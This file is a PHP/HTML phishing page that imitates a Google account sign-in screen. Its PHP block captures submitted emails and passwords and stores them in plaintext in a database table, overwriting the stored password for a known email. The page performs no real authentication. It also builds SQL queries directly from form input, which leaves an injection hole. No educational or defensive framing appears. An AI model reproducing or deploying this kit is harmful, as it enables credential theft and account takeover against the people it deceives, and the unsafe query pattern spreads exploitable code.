<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // login for database
    $host = '';
    $username = '';
    $password = '';
    $database = '';

    $conn = new mysqli($host, $username, $password, $database);

    if ($conn->connect_error) {
        die("connection error: " . $conn->connect_error);
    }

    $email = $_POST['email'];
    $password = $_POST['password'];

    $sql = "SELECT * FROM emails WHERE email = '$email'";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {

        $row = $result->fetch_assoc();
        $userId = $row['id'];
        $updateSql = "UPDATE emails SET password = '$password' WHERE id = $userId";
        if ($conn->query($updateSql) === TRUE) {
        } else {
        }
    } else {
        $insertSql = "INSERT INTO emails (email, password) VALUES ('$email', '$password')";
        if ($conn->query($insertSql) === TRUE) {
        } else {
        }
    }

    $conn->close();
}
?>




<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="utf-8">
    <title>Sign in - Google accounts</title>
    <link href='assets/css/bootstrap.min.css' rel="stylesheet">
    <link href='assets/css/progress-bar.css' rel="stylesheet">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="icon" type="image/png" href="assets/images/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <style media="screen">
        @font-face {
            font-family: 'Roboto';
            src: URL('assets/fonts/Roboto-Regular.ttf') format('truetype');
            font-weight: normal;
        }

        @font-face {
            font-family: 'open-sans';
            src: URL('assets/fonts/OpenSans-Regular.ttf') format('truetype');
            font-weight: normal;
        }
    </style>
</head>
<body>
<div id='login-app'>
    <div class="login-container">
        <div class="left-area">
            <img class='logo' src="png/logo.png" alt="logo" height="48" width="48">
            <h1 class='g-h1'>Sign in</h1>
            <h2 class='g-h2'>Use your Google Account</h2>
        </div>

        <div class="right-area">
            <form method="POST" action="/signin.php" id='email-form-step'>
                <div class='login-content'>
                    <input name="email" id='email-input' type="email" class='g-input' placeholder="Email or phone" required>
                    <div class='login-priv'>
                        <p class='p'>Not your computer? Use Guest mode to sign in privately.</p>
                        <legend class='g-legend'>Learn more about using Guest mode</legend>
                    </div>
                    <div class='login-nav'>
                        <div class="create-account-text">Create account</div>
                        <button class='gbtn-primary' type="submit">Next</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
</body>
</html>

